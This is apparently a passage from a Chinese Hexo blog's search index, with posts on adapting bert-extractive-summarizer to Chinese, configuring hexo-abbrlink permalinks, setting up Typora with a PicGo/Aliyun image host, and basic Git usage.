title="饕林餐厅"></a>饕林餐厅</h2><p>网红店。个人觉得很一般，而且偏贵。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美食 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『工程记录』修改bert-extractive-summarizer项目用于中文文本摘要任务</title>
      <link href="/posts/fbe6.html"/>
      <url>/posts/fbe6.html</url>
      
        <content type="html"><![CDATA[<h1 id="motivation"><a href="#motivation" class="headerlink" title="motivation"></a>motivation</h1><p>本文为bert-extractive-summarizer项目改中文模型记录</p><ul><li><p>主页文档：<a href="https://pypi.org/project/bert-extractive-summarizer/">https://pypi.org/project/bert-extractive-summarizer/</a></p></li><li><p>github项目地址：<a href="https://github.com/dmmiller612/bert-extractive-summarizer">https://github.com/dmmiller612/bert-extractive-summarizer</a></p></li></ul><p>该模型的原理在于：通过bert生成句子嵌入，对句子嵌入做聚类，找到最接近聚类质心的句子，同时使用<a href="https://github.com/huggingface/neuralcoref">neuralcoref</a>库实现共指消解功能（比较符合目前的业务，项目数据集中的政治新闻大多系外媒台媒文章，不像国内的文章那样规范，行文比较随意，同时因为外文翻译为中文存在一些语句翻译质量低，所以存在很多的指代问题）</p><p>发现原始模型做的是英文的摘要生成，要进行中文摘要需要将其修改成中文的Bert模型和分词器，参考作者给出的<a href="https://geek.digiasset.org/pages/nlp/nlpinfo/bert-text-summarizer-chinese/">中文模型文档</a>和github下的<a href="https://github.com/dmmiller612/bert-extractive-summarizer/issues/45">issue</a>完成了中文摘要的提取。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="spacy-neuralcoref-搭建共指消解环境"><a href="#spacy-neuralcoref-搭建共指消解环境" class="headerlink" title="spacy + neuralcoref 搭建共指消解环境"></a>spacy + neuralcoref 搭建共指消解环境</h2><p>指代消解任务通过<code>spacy + uralcoref</code>实现。spacy是一个NLP领域的文本预处理Python库，包括分词、词性标注、依存分析等多个nlp基础任务的实现，neuralcoref相当于一个插件，在spacy框架下实现指代消解。</p><p>我在初次安装过程中<strong>出现了Spacy和neuralcoref的版本适配问题</strong>，安装很多版本都不能顺利运行，各种error。最终找到一个匹配的安装方式，按照下面的流程来进行安装的话应该不会出现兼容性的问题。</p><p>如果你是<strong>英文任务</strong>的话，推荐：<strong>spacy 2.1.0 + neuralcoref 4.0 + en_core_web_sm-2.1.0</strong></p><blockquote><p>但是这一套对中文模型版本并不适用， neuralcoref并不支持中文共指消解。所以对中文任务而言，如果要使用这里的共指消解，需要使用其他的支持中文的共指消解工具。</p><p>因此<strong>我们后面的中文摘要生成部分并没有使用共指消解，后续有机会可以尝试加上</strong></p></blockquote><p>我们先pip install spacy&#x3D;&#x3D;2.1.0，前面提到neuralcoref相当于spaCy的一个插件，所以先安装neuralcoref会自动帮我们安装 spacy，可能会产生版本冲突。</p><p>接下来安装spacy 2.1.0版本库上的 transformer-based pipelines 的预训练模型 en_core_web_sm-2.1.0，<strong>注意这里的版本一定要和前面的spacy一样</strong>，产生报错建议手动安装 </p><p>安装完spacy后安装neuralcoref，<strong>建议这里去pypi上找到对应的 <a href="https://pypi.org/project/neuralcoref/#files">neuralcoref包</a> 下载到本地后手动安装</strong>，不然可能会产生下面的报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231215165152653.png" alt="image-20231215165152653"></p><h2 id="搭建-bert-extractive-summarizer-环境"><a href="#搭建-bert-extractive-summarizer-环境" class="headerlink" title="搭建 bert-extractive-summarizer 环境"></a>搭建 bert-extractive-summarizer 环境</h2><p>首先从github上clone该项目</p><p>然后运行一个小demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> summarizer <span class="keyword">import</span> Summarizer</span><br><span class="line"></span><br><span class="line">body = <span class="string">&quot;This repo is the generalization of the lecture-summarizer repo. This tool utilizes the HuggingFace Pytorch transformers library to run extractive summarizations. This works by first embedding the sentences, then running a clustering algorithm, finding the sentences that are closest to the cluster&#x27;s centroids. This library also uses coreference techniques, utilizing the https://github.com/huggingface/neuralcoref library to resolve words in summaries that need more context. The greedyness of the neuralcoref library can be tweaked in the CoreferenceHandler class.As of the most recent version of bert-extractive-summarizer, by default, CUDA is used if a gpu is available.&quot;</span></span><br><span class="line">model = Summarizer()</span><br><span class="line">result = model(body, num_sentences=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>下载好相应的依赖后发现出现报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231218101532243.png" alt="image-20231218101532243"></p><p>这里的报错原因在于：代码试图从Hugging Face模型存储库（<a href="https://huggingface.co)下载模型文件,但由于网站不稳定等原因无法连接到该服务器./">https://huggingface.co）下载模型文件，但由于网站不稳定等原因无法连接到该服务器。</a></p><blockquote><p>在使用Hugging Face Transformers库时（很多需要用到某些模型的机器学习库都是这样），如果你指定的模型没有在本地缓存中找到，库会尝试从Hugging Face模型存储库下载所需的模型文件，以便进行后续的模型初始化和使用。这是因为模型文件通常比较大，不方便直接包含在库中，因此在需要时会动态下载。</p></blockquote><p>因此这里我们选择手动下载模型</p><h2 id="手动下载中文模型"><a href="#手动下载中文模型" class="headerlink" title="手动下载中文模型"></a>手动下载中文模型</h2><p>Hugging Face Transformers库所使用的默认bert模型 bert-large-uncased 只可以用于英文语料，如果我们要将该项目应用在中文的摘要任务上需要稍作修改，使用一个中文的bert模型和一个中文的分词器。</p><p>首先我们<strong>手动下载中文的bert模型 bert-base-chinese</strong> </p><p>打开Hugging Face的官网搜索我们想要的模型<a href="https://huggingface.co/bert-base-chinese">bert-base-chinese</a>，点击files，下载下面红框内的四个文件，然后根据你使用的框架选择相应的模型文件，如果使用的是pytorch就下载pytorch_model.bin，如果是TensorFlow就换成tf_model.h5，这里我们使用的是pytorch，所以选择pytorch_model.bin进行下载。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231218103610166.png" alt="image-20231218103610166"></p><p>将下载好的文件放在我们的项目目录下，比如我这里建立了一个bert-base-chinese文件夹存放：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231218104219354.png" alt="image-20231218104219354"></p><p>接下来将需要用到该模型的地方修改为我们本地的路径就可以了</p><h1 id="修改源代码"><a href="#修改源代码" class="headerlink" title="修改源代码"></a>修改源代码</h1><p>spacy默认使用英文分词，我们需要将其改成中文。</p><p>将 <code>bert-extractive-summarizer/summarizer/sentence_handler.py</code> 下的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> spacy.lang.en <span class="keyword">import</span> English </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, language=English</span>):</span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> spacy.lang.zh <span class="keyword">import</span> Chinese</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, language=Chinese</span>):</span><br></pre></td></tr></table></figure><h1 id="测试模型"><a href="#测试模型" class="headerlink" title="测试模型"></a>测试模型</h1><p>在主目录下创建test.py测试模型，在这里我们使用的是自己手动下载的模型，使用<code>AutoConfig</code>、<code>AutoTokenizer</code>和<code>AutoModel</code>来加载bert-base-chinese&#x2F;目录下的模型和相关配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> summarizer <span class="keyword">import</span> Summarizer</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load model, model config and tokenizer via Transformers</span></span><br><span class="line">custom_config = AutoConfig.from_pretrained(<span class="string">&#x27;bert-base-chinese/&#x27;</span>)</span><br><span class="line">custom_config.output_hidden_states=<span class="literal">True</span></span><br><span class="line">custom_tokenizer = AutoTokenizer.from_pretrained(<span class="string">&#x27;bert-base-chinese/&#x27;</span>)</span><br><span class="line">custom_model = AutoModel.from_pretrained(<span class="string">&#x27;bert-base-chinese/&#x27;</span>, config=custom_config)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">body = <span class="string">&#x27;准行政院长陈建仁，在公布原文化部长李永得将转任政务委员之后，传出将征询高雄市副市长史哲，出任文化部长。被称为「点子王」的史哲，不但一手催生驳二和高雄总图，10几年来也不断扩展高雄的设计能量，像是高雄春天艺术节、重办大港开唱等等，史哲都是幕后重要推手，但目前文化部仍有公视法修法和中正纪念堂转型，两大关键政策预计要在今年推动，势必将成为检验内阁改组的重要指标。灰色西装外套配上细框眼镜，高雄市副市长史哲，出席海事展剪彩活动，作为高雄近年艺文展演重要推手的他，如今传出可能接任文化部长，立委(民)赵天麟说：「史哲副市长有非常丰富的行政经历，在陈菊市长时代就被称为点子王，在陈其迈市长的时代里面，他更是把亚洲新湾区，变成了是一个国际非常知名的亮点，我相信可以把，这么成功的高雄经验南方经验，成为未来的台湾之光。」盘点史哲过去艺文经历，不但曾担任过高雄的新闻处长，文化局长等等，也曾操刀陈水扁的竞选广告，2009年世运会开幕典礼，筹画设计的三太子骑机车，一举让台湾跃上国际舞台，另外催生驳二和高雄总图，以及推出高雄春天艺术节，重办大港开唱等等，也都出自史哲之手，源源不绝的创意经验，堪称超级点子王。立委(国)李德维说：「他过去长期是在民进党内参与政治活动，尤其是相关的学运以及工运，现在却因为担任高雄市的文化局长，就要升任文化部长，真的让人大失所望。」虽然史哲并没证实即将入阁，不过原文化部长李永得，已经要转任政委，而目前文化部仍有公视法修法，和中正纪念堂转型两大关键政策，预计要在今年推动，究竟最终，是不是由史哲继续接手，未来文化部长的执行力，将成为检验内阁改组的重要指标。新闻来源：华视新闻&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">model = Summarizer(custom_model=custom_model, custom_tokenizer=custom_tokenizer)</span><br><span class="line"><span class="built_in">print</span>(model(body, num_sentences=<span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">准行政院长陈建仁，在公布原文化部长李永得将转任政务委员之后，传出将征询高雄市副市长史哲，出任文化部长。 被称为「点子王」的史哲，不但一手催生驳二和高雄总图，10几年来也不断扩展高雄的设计能量，像是高雄春天艺术节、重办大港开唱等等，史哲都是幕后重要推手，但目前文化部仍有公视法修法和中正纪念堂转型，两大关键政策预计要在今年推动，势必将成为检验内阁改组的重要指标。 立委(国)李德维说：「他过去长期是在民进党内参与政治活动，尤其是相关的学运以及工运，现在却因为担任高雄市的文化局长，就要升任文化部长，真的让人大失所望。」</span><br></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://blog.csdn.net/du_lun/article/details/129462104">https://blog.csdn.net/du_lun/article/details/129462104</a></li><li><a href="https://blog.csdn.net/m0_46295727/article/details/133221439">https://blog.csdn.net/m0_46295727/article/details/133221439</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工程记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bert </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『SEO优化』：Hexo-abbrlink插件生成hexo永久固定链接</title>
      <link href="/posts/1e78.html"/>
      <url>/posts/1e78.html</url>
      
        <content type="html"><![CDATA[<h1 id="hexo默认url格式存在的问题"><a href="#hexo默认url格式存在的问题" class="headerlink" title="hexo默认url格式存在的问题"></a>hexo默认url格式存在的问题</h1><p>Hexo在生成博客文章链接时，默认的静态URL格式是 <code>:year/:month/:day/:title</code>，也就是按照年、月、日、标题格式来生成固定链接的，如<code>http://xxx.yy.com/2020/07/06/hello-world</code>。</p><p><strong>这样的话就会存在一些问题：</strong></p><ul><li><p>如果你的标题是中文的话，你的URL链接就会包含中文，例如：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231204194948770.png" alt="image-20231204194948770"></p><p>这样的url路径复制后会将中文变成一大堆字符串编码：<a href="https://cnhuazhu.top/butterfly/2023/03/01/Flask/%E9%83%A8%E7%BD%B2Flask%E9%A1%B9%E7%9B%AE%E8%87%B3%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84Docker%E5%AE%B9%E5%99%A8%E5%86%85/">https://cnhuazhu.top/butterfly/2023/03/01/Flask/%E9%83%A8%E7%BD%B2Flask%E9%A1%B9%E7%9B%AE%E8%87%B3%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84Docker%E5%AE%B9%E5%99%A8%E5%86%85/</a> </p><p>如果你在其它地方用了你自己这篇文章的url链接，偶然你又修改了该文章的标题，那<strong>这个url链接就会失效</strong>。</p></li><li><p>这样的url格式中年月日都会有分隔符，生成的链接会成为一个四级目录，<strong>对于搜索引擎来说并不是很友好。</strong></p><blockquote><p>百度蜘蛛在抓取网页时遵循以下规则：</p><p>网页的抓取频率与其权重和信用度成正比，尤其是对网站的首页和内页。通常，蜘蛛首先抓取网站的首页，因为首页通常具有更高的权重，而且大多数链接都指向首页。然后，通过首页抓取网站的内页，但并非所有内页都会被蜘蛛抓取。</p><p>搜索引擎认为对于一般的中小型站点，3层结构足以包含所有内容，因此蜘蛛主要抓取前三层的内容。超过三层的内容被认为相对不重要，因此蜘蛛不会经常爬取这些内容。因此，在设计链接结构时，最好将permalink后面的层级控制在2个斜杠以内。</p></blockquote></li></ul><h1 id="hexo-abbrlink的安装配置"><a href="#hexo-abbrlink的安装配置" class="headerlink" title="hexo-abbrlink的安装配置"></a><strong>hexo-abbrlink的安装配置</strong></h1><p>为了解决上面提到的问题，我们使用Hexo的插件<strong>hexo-abbrlink</strong>，它能将 Hexo 生成的永久链接转化为一个固定的随机值，极大的缩短了永久链接的长度。一旦生成一个随机值，之后对文章的标题或者时间进行任何修改，这个随机的 abbrlink 是不会发生任何变化的，也为 Hexo 的维护提供了便利。</p><p>博客目录下执行命令安装：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$npm install hexo-abbrlink --save </span><br></pre></td></tr></table></figure><p>修改<code>_config.yml</code>文件中的配置项（记得把原来的<code>permalink:</code>删除掉）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#设置永久链接</span><br><span class="line">permalink: posts/:abbrlink.html  </span><br><span class="line">abbrlink:</span><br><span class="line">    alg: crc16   #算法： crc16(default) and crc32</span><br><span class="line">    rep: dec     #进制： dec(default) and hex</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><blockquote><p>参考文章<a href="https://zhuanlan.zhihu.com/p/169492685">https://zhuanlan.zhihu.com/p/169492685</a></p><p>在生成之前就要改好算法和形式。不然后面再改的话会导致链接不统一。我就踩过坑，但后来是一个文章一个文章删除<code>abbrlink:</code>的值才改过来的，还好我文章不是很多。</p><p>话说最近看到了Hexo-abbrlink2这个插件，可以从1.html开始编。</p><p>我试用了一下，会导致文章重复，正在研究如何解决。如果能从1开始编写的话，这样更容易看得出写了多少篇文章，当前上传和修改的是哪一篇。后面再研究。</p><p>PS：刚使用这个插件后，阅读人数和评论都会变为0，介意慎用！综上所述，这插件适合新站！</p></blockquote><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>侵权删：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/112318081">https://zhuanlan.zhihu.com/p/112318081</a></li><li><a href="https://zhuanlan.zhihu.com/p/169492685">https://zhuanlan.zhihu.com/p/169492685</a></li><li><a href="https://cloud.tencent.com/developer/article/1936315">https://cloud.tencent.com/developer/article/1936315</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『typora』相关配置与体验优化</title>
      <link href="/posts/c91a.html"/>
      <url>/posts/c91a.html</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍typora配置过程中的一些<strong>问题的解决方法</strong>以及<strong>优化体验方案</strong>。</p><h1 id="版本过期报错"><a href="#版本过期报错" class="headerlink" title="版本过期报错"></a>版本过期报错</h1><p>下载完成后如果出现版本过期的报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231204191844101.png" alt="image-20231204191844101"></p><p>具体解决方法参考：<a href="https://blog.csdn.net/wagnteng/article/details/126585618">https://blog.csdn.net/wagnteng/article/details/126585618</a></p><h1 id="设置右键菜单新建md"><a href="#设置右键菜单新建md" class="headerlink" title="设置右键菜单新建md"></a>设置右键菜单新建md</h1><p>任意位置创建一个txt文件，后缀改为reg</p><p>文件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\.md]</span><br><span class="line">@=&quot;Typora.md&quot;</span><br><span class="line">&quot;Content Type&quot;=&quot;text/markdown&quot;</span><br><span class="line">&quot;PerceivedType&quot;=&quot;text&quot;</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\.md\ShellNew]</span><br><span class="line">&quot;NullFile&quot;=&quot;&quot;</span><br></pre></td></tr></table></figure><p>完成后运行，运行完成后可以删除掉该文件</p><h1 id="图床配置：阿里云-PicGo-Core-command-line"><a href="#图床配置：阿里云-PicGo-Core-command-line" class="headerlink" title="图床配置：阿里云 + PicGo Core (command line)"></a>图床配置：阿里云 + PicGo Core (command line)</h1><p>Typora是一个跨平台的markdown编辑器，使用markdown编辑器写文章优点是排版简洁，痛点则是无法像Word那样直接嵌入图片，插入的图片实际上插入的是图片的路径（可以是本地路径也可以是网络路径），默认情况下为本地路径，这种情况下的md文档在别的终端上打开会无法查看图片。</p><p><strong>我们可以自己配置图床构建网络路径，来实现md文档的跨平台跨设备浏览</strong></p><p>下面介绍这里采用阿里云 + PicGo Core (command line)的方法来对图床进行配置的方法：</p><p><strong>1. PicGo Core (command line)下载与配置</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716132921821.png" alt="image-20230716132921821"></p><p>下载完成后打开找到文件夹 <code>C:\Users\用户名\AppData\Roaming\Typora\picgo\win64\</code> ，在对应文件夹下cmd执行 <code>./.config/Typora/picgo/linux/picgo install gitee-uploader</code>，若执行失败需要去安装nodejs环境</p><blockquote><p>nodejs安装教程：<a href="https://blog.csdn.net/zimeng303/article/details/112167688">https://blog.csdn.net/zimeng303/article/details/112167688</a></p></blockquote><p>完成后打开配置文件</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/348e3092fc111d18984bd35b197a3357.png" alt="image-20200620214326041"></p><p>文件内容修改如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;picBed&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;uploader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aliyun&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;aliyun&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;accessKeyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;accessKeySecret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bucket&quot;</span><span class="punctuation">:</span> <span class="string">&quot;isodatop&quot;</span><span class="punctuation">,</span> <span class="comment">// 存储空间名</span></span><br><span class="line">      <span class="attr">&quot;area&quot;</span><span class="punctuation">:</span> <span class="string">&quot;oss-cn-beijing&quot;</span><span class="punctuation">,</span> <span class="comment">// 存储区域代号</span></span><br><span class="line">      <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;img/&quot;</span><span class="punctuation">,</span> <span class="comment">// 自定义存储路径</span></span><br><span class="line">      <span class="attr">&quot;customUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://isodatop.oss-cn-beijing.aliyuncs.com&quot;</span><span class="punctuation">,</span> <span class="comment">// 自定义域名，注意要加 http://或者 https://</span></span><br><span class="line">      <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span> <span class="comment">// 针对图片的一些后缀处理参数 PicGo 2.2.0+ PicGo-Core 1.4.0+</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;picgoPlugins&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;picgo-plugin-gitee-uploader&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>accesskeyid与secret的获取：</strong></p><p>登录阿里云，进入控制台，可以在里面查看这两个字段</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170158751.png" alt="image-20230716170158751"></p></li><li><p><strong>bucket、area、customUrl的获取</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170626283.png" alt="image-20230716170626283"></p><p>再点击进入bucket，bucket名称即为isodatop</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170714631.png" alt="image-20230716170714631"></p><p>点击概览</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170833593.png" alt="image-20230716170833593"></p><p>这里的②为<code>oss-cn-beijing.aliyuncs.com</code>，注意要去掉后面的<code>.aliyuncs.com</code>，将<code>oss-cn-beijing</code>填入area字段</p><p>③为<code>isodatop.oss-cn-beijing.aliyuncs.com</code>，添加上<code>https://</code>后填入 customUrl 字段</p><p><strong>2. 测试</strong></p><p>配置完成后打开typora的偏好设置，验证上传服务是否配置成功</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716171455885.png" alt="image-20230716171455885"></p><p>出现如下界面则上传成功：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716171616617.png" alt="image-20230716171616617"></p><blockquote><p><strong>如果出现报错或者上传成功但是图片在typora里面不予显示的情况</strong>：</p><p>注意检查前面几个字段是否按照要求进行了删除与添加相应的字段</p></blockquote></li></ul><h1 id="优化体验设置"><a href="#优化体验设置" class="headerlink" title="优化体验设置"></a>优化体验设置</h1><ul><li>文本高亮：<a href="https://blog.csdn.net/weixin_40626630/article/details/111405928">https://blog.csdn.net/weixin_40626630/article/details/111405928</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 资源工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『Git』Git使用教程</title>
      <link href="/posts/b860.html"/>
      <url>/posts/b860.html</url>
      
        <content type="html"><![CDATA[<h1 id="克隆GitHub仓库到本地"><a href="#克隆GitHub仓库到本地" class="headerlink" title="克隆GitHub仓库到本地"></a>克隆GitHub仓库到本地</h1><p>方法一：Code -&gt; Download ZIP（有的时候会有一些问题，不建议）</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231215133946737.png" alt="image-20231215133946737"></p><p><strong>方法二：使用git clone项目到本地（推荐）</strong></p><p>Code -&gt; 复制HTTPS协议对应的url。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231215134218730.png" alt="image-20231215134218730"></p><p>在本地文件夹打开Git Bash，在命令行中输入以下命令，将仓库克隆到本地（这里的仓库地址就是上面复制的url）：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">clone</span> <span class="title">仓库地址</span></span><br></pre></td></tr></table></figure><p>执行命令后，Git就会从GitHub服务器上将仓库的所有文件和历史记录克隆到你的本地目录中。克隆完成后，你可以在当前目录下找到一个与仓库同名的文件夹，里面包含了完整的仓库内容。</p><p>后续可以安装相关依赖等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt --user</span><br></pre></td></tr></table></figure><h1 id="本地代码和GitHub同步"><a href="#本地代码和GitHub同步" class="headerlink" title="本地代码和GitHub同步"></a>本地代码和GitHub同步</h1><h2 id="将github项目pull到本地"><a href="#将github项目pull到本地" class="headerlink" title="将github项目pull到本地"></a>将github项目pull到本地</h2><p><strong>第一次pull：</strong></p><p>即将远程代码仓库中(新)的内容下载到本地，并更新本地代码仓库的内容，我们一般叫pull。</p><p>首先需要在本地创建一个空文件夹，作为项目的存放仓库。然后进入该文件夹下，打开Git Bush，输入以下命令将该目录初始化为Git仓库。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git init</span><br></pre></td></tr></table></figure><p>（之后该处会生成一个隐藏的文件夹【.git】）</p><p>然后将这个本地仓库连接到Github上的对应项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote add origin 远程仓库地址</span><br></pre></td></tr></table></figure><p>这里的远程仓库地址就是前面所复制的HTTPS协议对应的url</p><blockquote><p>如果不小心填错了，可以使用指令清除地址重新设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote remove origin </span><br></pre></td></tr></table></figure><p>同样也可以执行命令查看是否连接成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v</span><br></pre></td></tr></table></figure></blockquote><p>然后，使用Pull指令拉取代码，从远程源的主分支更新代码到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin master</span><br></pre></td></tr></table></figure><p><strong>后续拉取github上的更新到本地：只需要git pull即可</strong></p><h2 id="将本地项目push到github"><a href="#将本地项目push到github" class="headerlink" title="将本地项目push到github"></a>将本地项目push到github</h2><p>第一次push：</p><p>同样的，创建空文件夹后git init</p><p>执行add命令<strong>将整个文件夹添加到本地仓库</strong>，注意后面有一个点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure><blockquote><p>如果只想添加单个文件使用命令：<code> git add 文件名</code> 这种方式 ，例如：git add test.txt.</p></blockquote><p><strong>后续将本地更新后的代码上传到GitHub只需要</strong></p><p>如果在多个远程设备上操作，记得开始进行今日的操作前要先：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure><p>完成所有操作准备离开时要记得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m ‘xx’</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p>tip: 要保证本地库和server是同步的，不然忘记先pull，若其他远程设备上已经push了新的内容，自己这里是push不上去的，只能进行git pull合并，这个操作还会覆盖你已经更改了的部分，会非常痛苦。</p><h3 id="如何设置不push某些内容上去"><a href="#如何设置不push某些内容上去" class="headerlink" title="如何设置不push某些内容上去"></a>如何设置不push某些内容上去</h3><h1 id="常见问题"><a href="#常见问题" class="headerlink" 